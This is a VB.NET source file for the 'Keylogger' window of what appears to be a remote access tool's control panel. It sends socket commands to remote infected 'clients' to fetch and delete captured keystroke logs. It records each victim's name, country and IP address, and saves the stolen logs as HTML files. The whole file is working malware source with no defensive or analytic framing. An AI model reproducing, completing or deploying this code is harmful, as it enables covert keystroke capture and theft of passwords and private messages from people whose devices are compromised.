Imports System.ComponentModel
 Public Class Keylogger
     Public Client As Net.Sockets.TcpClient
     Public classClient As sockets.Client
     Public Title As String = "null"
    Public IsActive As Boolean = False
     Public tmpFolderUSER, tmpClientName, tmpCountry, tmpAddressIP As String
    Sub New()
         InitializeComponent()
         Me.Font = reso.f
     End Sub
    Private Sub SpyStyle()
                      End Sub
    Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles TOpacity.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.TOpacity.Enabled = False
        End If
    End Sub
    Private Sub Keylogger_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.ctxMenu.Renderer = New ThemeToolStrip
         DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f
         DGV0.DefaultCellStyle.Font = reso.f
         Me.DGV0.ContextMenuStrip = Me.ctxMenu
         Me.Icon = New Icon(reso.res_Path & "\Icons\win\19.ico")
         Me.Text = Title
         SpyStyle()
         SaveToolStripMenuItem.Visible = True
         SaveAsToolStripMenuItem.Visible = True
         Me.TOpacity.Interval = SpySettings.T_Interval
         Me.TOpacity.Enabled = True
    End Sub
     Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If Not IsActive Then
            MsgBox("Accessibilty Not Enabled.")
            Return
        End If
        If combologs.Text.Length < 1 Or combologs.Text Is Nothing Then
            MsgBox("No  Logs Found...")
            Return
        End If
         If Me.classClient IsNot Nothing Then
            Try
                  Dim spl As String() = classClient.Keys.Split(":")
                Dim objs As Object() = {Client, SecurityKey.KeysClient2 & sockets.Data.SPL_SOCKET & "rd<*>" & Codes.BSEN(combologs.Text) & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & SecurityKey.Lockscreen & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Codes.Encoding().GetBytes("null"), classClient}
                 classClient.SendAsync(objs)
             Catch ex As Exception
             End Try
        End If
    End Sub
     Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If Not IsActive Then
            MsgBox("Accessibilty Not Enabled.")
            Return
        End If
        If combologs.Text.Length < 1 Or combologs.Text Is Nothing Then
            MsgBox("No  Logs Found...")
            Return
        End If
         If Not MessageBox.Show("Log will deleted completely ," + vbNewLine + "Accept ?", "Keylogger", MessageBoxButtons.YesNo) = DialogResult.Yes Then
             Return
        End If
         If Me.classClient IsNot Nothing Then
            Try
                  Dim spl As String() = classClient.Keys.Split(":")
                Dim objs As Object() = {Client, SecurityKey.KeysClient2 & sockets.Data.SPL_SOCKET & "rdd<*>" & Codes.BSEN(combologs.Text) & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & SecurityKey.Lockscreen & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Codes.Encoding().GetBytes("null"), classClient}
                 classClient.SendAsync(objs)
                Me.combologs.Text = ""
            Catch ex As Exception
             End Try
        End If
    End Sub
     Delegate Sub OffLOG(objs As Object())
    Public Sub Done(objs As Object())
        If Me.DataGridView1.InvokeRequired Then
            Dim logr As OffLOG = New OffLOG(AddressOf Done)
            Me.DataGridView1.Invoke(logr, New Object() {objs})
            Exit Sub
        Else
             Me.DataGridView1.Rows.Add(objs(0), objs(1), objs(2))
        End If
    End Sub
                       Private Sub Keylogger_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
         If Not classClient Is Nothing Then
             classClient.Keylogg = False
             Dim objs As Object() = {Client, SecurityKey.KeysClient9 & sockets.Data.SPL_SOCKET & SecurityKey.Keylogger, Codes.Encoding().GetBytes("null"), classClient}
             classClient.SendAsync(objs)
         End If
     End Sub
     Private Sub SaveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveToolStripMenuItem.Click
        reso.Directory_Exist(classClient)
        Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {Me.DGV0, tmpFolderUSER, "Keylogger",
        tmpClientName, tmpCountry & " - " & tmpAddressIP, "Keylogger", "log", DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"})
     End Sub
     Private Sub SaveAsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveAsToolStripMenuItem.Click
        Dim SaveAS As New SaveFileDialog
        SaveAS.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"
        SaveAS.Filter = "html (*.html)|*.html"
        If SaveAS.ShowDialog = Windows.Forms.DialogResult.OK Then
            Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {Me.DGV0, "null", SaveAS.FileName,
            tmpClientName, tmpCountry & " - " & tmpAddressIP, "Keylogger", "log", "null"})
        End If
        SaveAS.Dispose()
    End Sub
End Class